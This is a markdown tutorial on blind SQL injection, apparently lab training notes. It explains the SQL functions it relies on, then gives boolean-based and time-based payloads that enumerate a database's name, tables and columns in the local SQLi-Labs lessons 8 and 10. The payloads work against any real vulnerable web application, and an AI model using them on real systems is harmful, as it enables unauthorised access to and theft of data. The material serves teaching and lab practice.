<h1 align="center">Blind SQL Injection</h1>

# Boolean Based SQL Injection

- Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response


# SQl function you need to know


## `length()`

- Return the length of the string, in bytes

#### Syntax

`LENGTH(string)`

- eg. `SELECT LENGTH("SQL Tutorial");`
- eg. `SELECT LENGTH(databse());`



## `substring()`

- The `SUBSTRING()` function extracts a substring from a string (starting at any position).

#### Syntax

`SUBSTRING(string, start, length)`

- eg. `SUBSTRING("sqltest",2,3;)`
- eg. `SUBSTRING(database(),1,1)`




## `ascii()`

- The ASCII() function returns the ASCII value for the specific character

#### Syntax

`ASCII(character)`

## `CHAR()`

-  `CHAR()` returns the character value of the given integer value according to the ASCII table

#### Syntax

`CHAR(ASCII number)`


## `IF()`

- The IF() function returns a value if a condition is TRUE, or another value if a condition is FALSE

#### Syntax

`IF(condition, value_if_true, value_if_false)`

- eg. ` IF(500<1000, "YES", "NO")`





<br>


<h1 align="center">Practical Lab (Boolean-Based) Training </h1>


`In this session, We used SQLi Lab Lesson-8`

## 1. Finding parameter to inject 

`http://localhost:8000/chapter1/sqli_lab/Less-8/?id=2`

- Background Query

	- `SELECT * FROM table_name WHERE id='2'`

## 2. Identify the vulnearbility

- 1. test with quote `'` or `"`
- 2. Fix Error with `-- -` or `--+`
- 3. Testing with condition

	- TRUE  Condition ==> `AND 1=1` or `AND '1'='1` 
	- FALSE Condition ==> `AND 1=2` or `AND '1'='2` 

## 3. Emnumerate Data

### 1. Finding Length of Database

- Use `<` and `=` operater and find the length of Database name
- `AND (LENGTH(database())) < 10` 
- `AND (LENGTH(database())) = 8` 

### 2. Finding Database name using `ascii()` and `substring()` Function


- `AND (ascii(substring(database(),1,1))) < 100`

### 3. Finding Table name 

#### Step by step payload creation

- `AND (ascii(substring()))`

- `(select table_name from information_schema.tables where table_schema= database() limit 0,1);
`

#### Final payload (I already know user tables is fourth table and then use `limit 3,1`)

- `AND (ascii(substring((select table_name from information_schema.tables where table_schema= database() limit 3,1), 1,1 ))) < 100`

### 4. Finding Column name


`AND (ascii(substring((select column_name from information_schema.columns where table_name = 'users' and table_schema= database() limit 1,1), 1,1 ))) < 100`



<h1 align="center"> Time-Based Injection</h1>


## Mostly same as Boolean Based Injection and used SQLI lab `lesson 10`


## Identify the vulnerability

`' and sleep(10)--+`

`" and sleep(10)--+`

## Payload

`" and if(100<200,sleep(10),Null)--+`

`" and if(ascii(substring(database(),1,1)) = 115,sleep(10),Null)--+`




